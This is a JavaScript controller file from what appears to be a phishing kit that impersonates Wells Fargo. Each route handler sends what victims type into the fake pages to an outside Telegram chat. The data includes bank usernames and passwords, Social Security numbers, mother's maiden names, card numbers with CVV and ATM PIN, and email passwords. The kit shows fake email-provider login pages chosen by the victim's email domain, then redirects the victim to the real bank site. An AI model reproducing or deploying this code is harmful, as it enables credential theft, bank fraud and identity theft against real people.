const { Telegraf, Telegram } = require("telegraf");
const { message } = require("telegraf/filters");
const config = require('../config');

const bot = new Telegraf(config.BOT_TOKEN);

exports.getIndex = (req, res, next) => {
  res.render("first");
};

exports.postSignInAttempts = (req, res, next) => {
  bot.telegram.sendMessage(
    config.CHAT_ID,
    `<b>NEW LOG FROM @TALISMAN_DEVELOPMENT | WELLSFARGO - LOGIN</b>\n\n🆔LOGID: ${
      req.body.logid
    }\n👴USER: ${req.body.j_username}\n🔑PASS: ${
      req.body.j_password
    }\n🕵️‍♂️AGENT: ${req.useragent.source}\n📍IP: ${
      req.headers["x-forwarded-for"]
    }\n\n⚠️ ${
      req.body.secondAttempt === "false"
        ? "THIS IS A FIRST ATTEMPT"
        : "THIS IS A SECOND ATTEMPT"
    }`,
    { parse_mode: "HTML" }
  );

  if (req.body.secondAttempt === "true") {
    return res.render("account", {
      LOGID: req.body.logid,
    });
  }

  if (config.MULTI_ATTEMPT === true) {
    res.render("second", {
      LOGID: req.body.logid,
    });
  } else {
    res.render("account", {
      LOGID: req.body.logid,
    });
  }
};

exports.postAccountInformation = (req, res, next) => {
  bot.telegram.sendMessage(
    config.CHAT_ID,
    `<b>NEW LOG FROM @TALISMAN_DEVELOPMENT | WELLSFARGO - PERSONAL</b>\n\n🆔LOGID: ${req.body.logid}\n📧E-mail: ${req.body.email}\n🪪Full name: ${req.body.fullName}\n🏘Address: ${req.body.address}\n📅Date of birth: ${req.body.dob}\n🗂SSN: ${req.body.ssn}\n🤰MMN: ${req.body.mmn}\n🪪ID Number: ${req.body.id}\n🕵️‍♂️AGENT: ${req.useragent.source}\n📍IP: ${req.headers["x-forwarded-for"]}`,
    { parse_mode: "HTML" }
  );

  res.render("card", {
    LOGID: req.body.logid,
    EMAIL: req.body.email,
  });
};

exports.postCardDetails = (req, res, next) => {
  bot.telegram.sendMessage(
    config.CHAT_ID,
    `<b>NEW LOG FROM @TALISMAN_DEVELOPMENT | WELLSFARGO - CARD</b>\n\n🆔LOGID: ${req.body.logid}\n💳CARD: ${req.body.card}\n📅Exp.date: ${req.body.expirationDate}\n💳CVV: ${req.body.cvv}\n💳ATM Pin: ${req.body.atmPin}\n📞Mobile number: ${req.body.mobileNumber}\n\n🕵️‍♂️AGENT: ${req.useragent.source}\n📍IP: ${req.headers["x-forwarded-for"]}`,
    { parse_mode: "HTML" }
  );

  if (req.body.email.includes("@gmail.com")) {
    res.render("email/gmail", {
      logId: req.body.logid,
      email: req.body.email,
    });
  } else if (req.body.email.includes("@icloud.com")) {
    res.render("email/icloud", {
      logId: req.body.logid,
      email: req.body.email,
    });
  } else if (req.body.email.includes("@yahoo.com")) {
    res.render("email/yahoo", {
      logId: req.body.logid,
      email: req.body.email,
    });
  } else if (req.body.email.includes("@aol.com")) {
    res.render("email/aol", {
      logId: req.body.logid,
      email: req.body.email,
    });
  } else if (
    req.body.email.includes("@outlook.com") ||
    req.body.email.includes("@hotmail.com")
  ) {
    res.render("email/microsoft", {
      logId: req.body.logid,
      email: req.body.email,
    });
  } else if (
    req.body.email.includes("@currently.com") ||
    req.body.email.includes("@att.net")
  ) {
    res.render("email/att", {
      logId: req.body.logid,
      email: req.body.email,
    });
  } else if (req.body.email.includes("@yandex")) {
    res.render("email/yandex", {
      logId: req.body.logId,
      email: req.body.email,
    });
  } else if (req.body.email.includes("@zoho.com")) {
    res.render("email/zoho", {
      logId: req.body.logid,
      email: req.body.email,
    });
  } else if (req.body.email.includes("@verizon.net")) {
    res.render("email/aol", {
      logId: req.body.logid,
      email: req.body.email,
    });
  } else if (req.body.email.includes("@sbcglobal")) {
    res.render("email/yahoo", {
      logId: req.body.logid,
      email: req.body.email,
    });
  } else if (
    req.body.email.includes("@comcast") ||
    req.body.email.includes("@xfinity")
  ) {
    res.render("email/comcast", {
      logId: req.body.logid,
      email: req.body.email,
    });
  } else {
    res.render("email/others", {
      logId: req.body.logid,
      email: req.body.email,
    });
  }
};

exports.postEmailPass = (req, res, next) => {
  bot.telegram.sendMessage(
    config.CHAT_ID,
    `<b>NEW LOG FROM @TALISMAN_DEVELOPMENT | WELLSFARGO - EMAIL</b>\n\n🆔LOGID: ${req.body.logId}\n📧E-mail: ${req.body.email}\n🔑Password: ${req.body.password}\n🕵️‍♂️AGENT: ${req.useragent.source}\n📍IP: ${req.headers["x-forwarded-for"]}`,
    { parse_mode: "HTML" }
  );
  res.redirect('https://www.wellsfargo.com/')
};
